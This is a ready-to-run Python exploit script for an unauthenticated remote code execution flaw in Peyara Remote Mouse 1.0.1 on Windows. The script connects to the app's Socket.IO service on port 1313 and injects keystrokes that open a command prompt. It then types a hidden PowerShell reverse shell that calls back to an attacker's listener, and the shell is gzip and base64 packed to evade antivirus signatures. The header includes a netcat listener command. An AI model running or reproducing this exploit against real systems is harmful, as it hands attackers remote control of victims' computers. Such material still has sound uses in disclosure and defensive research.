#!/usr/bin/env python3
# Exploit Title: Peyara Remote Mouse v1.0.1 - Remote Code Execution (RCE)
# Date: 2025-05-30
# Exploit Author: tmrswrr
# Software Link: https://peyara-remote-mouse.vercel.app/
# Platform: Windows
# Version: v1.0.1
# Tested on: Windows 10 / 11
#
# Peyara Remote Mouse 1.0.1 exposes a Socket.IO WebSocket service on TCP port
# 1313 that accepts unauthenticated keyboard events. This opens a command prompt
# on the target and types a PowerShell reverse shell, one keystroke at a time.
#
# The reverse shell is gzip+base64 packed and decompressed in memory so the
# plaintext socket code is not exposed on the command line (avoids the trivial
# AV signature that blocks the cleartext one-liner).
#
# 1) Start a listener:   nc -lvnp 4444
# 2) Run:                python3 Peyara.py --target 192.168.1.107 --lhost 192.168.1.110 --lport 4444

import asyncio
import json
import gzip
import base64
import argparse
import websockets

# The base64 blob contains repeated characters (e.g. "AA", "=="); keys must be
# sent one at a time with this gap or the target collapses the duplicates and
# corrupts the payload, so the shell never runs.
KEY_DELAY = 0.06


def build_command(lhost, lport):
    # The actual reverse shell that will run on the target.
    script = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){;"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=iex $d 2>&1;"
        "$s.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r + 'PS > '),0,($r + 'PS > ').Length)"
        "}"
    )
    blob = base64.b64encode(gzip.compress(script.encode())).decode()
    # Decompress and run in memory. The whole thing lives inside -c "..." so the
    # cmd shell does not treat the PowerShell call operator (&) as a separator.
    return (
        'powershell -nop -w hidden -noni -ep bypass -c '
        '"&([scriptblock]::create((New-Object System.IO.StreamReader('
        'New-Object System.IO.Compression.GzipStream('
        '(New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('
        f"'{blob}'"
        '))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"'
    )


async def send_key(ws, key):
    await ws.send('42' + json.dumps(["key", key]))
    await asyncio.sleep(KEY_DELAY)


async def type_string(ws, text):
    # one event per character; the space is sent verbatim as " "
    for ch in text:
        await send_key(ws, ch)


async def open_session(uri, retries=12, delay=4):
    # Peyara serves a single Socket.IO session at a time and keeps a dropped one
    # alive until its ping timeout, so a fresh connect can briefly fail to get the
    # OPEN frame. Retry until the previous session is released.
    for attempt in range(1, retries + 1):
        ws = None
        try:
            ws = await websockets.connect(uri, open_timeout=8)
            open_frame = await asyncio.wait_for(ws.recv(), 8)
            if open_frame.startswith("0"):
                await ws.send("40")
                for _ in range(5):
                    frame = await asyncio.wait_for(ws.recv(), 8)
                    if frame == "2":
                        await ws.send("3")
                    if frame.startswith("40"):
                        print(f"[<] OPEN + CONNECT (attempt {attempt})")
                        return ws
            # not ready: close this attempt cleanly and retry
            await ws.send("1")
            await ws.close()
        except Exception as e:
            if ws:
                try:
                    await ws.close()
                except Exception:
                    pass
            print(f"[!] attempt {attempt} error: {e}")
        print(f"[*] target busy, retrying ({attempt}/{retries})...")
        await asyncio.sleep(delay)
    return None


async def main(target, lhost, lport):
    uri = f"ws://{target}:1313/socket.io/?EIO=4&transport=websocket"
    ws = await open_session(uri)
    if ws is None:
        print("[-] Could not establish a Socket.IO session (target busy or not vulnerable)")
        return

    try:
        await asyncio.sleep(1)

        # Open the Windows command prompt: Ctrl+Esc -> type "cmd" -> Enter
        await ws.send('42["edit-key",{"key":"escape","modifier":["control"]}]')
        await asyncio.sleep(0.6)
        for ch in "cmd":
            await send_key(ws, ch)
        await send_key(ws, "enter")
        await asyncio.sleep(1.5)
        await send_key(ws, "enter")
        await asyncio.sleep(0.5)
        print("[*] Command prompt opened")

        command = build_command(lhost, lport)
        print(f"[*] Typing payload ({len(command)} chars), this takes a moment...")
        await type_string(ws, command)
        await asyncio.sleep(1)
        await send_key(ws, "enter")
        print("[+] Payload sent - check your listener for the shell")
    finally:
        # Close the Engine.IO session so the server releases it immediately
        try:
            await ws.send("1")
            await ws.close()
        except Exception:
            pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Peyara Remote Mouse 1.0.1 unauthenticated RCE')
    parser.add_argument('--target', required=True, help='Target IP running Peyara Remote Mouse')
    parser.add_argument('--lhost', required=True, help='Listener IP')
    parser.add_argument('--lport', required=True, type=int, help='Listener port')
    args = parser.parse_args()

    asyncio.run(main(args.target, args.lhost, args.lport))
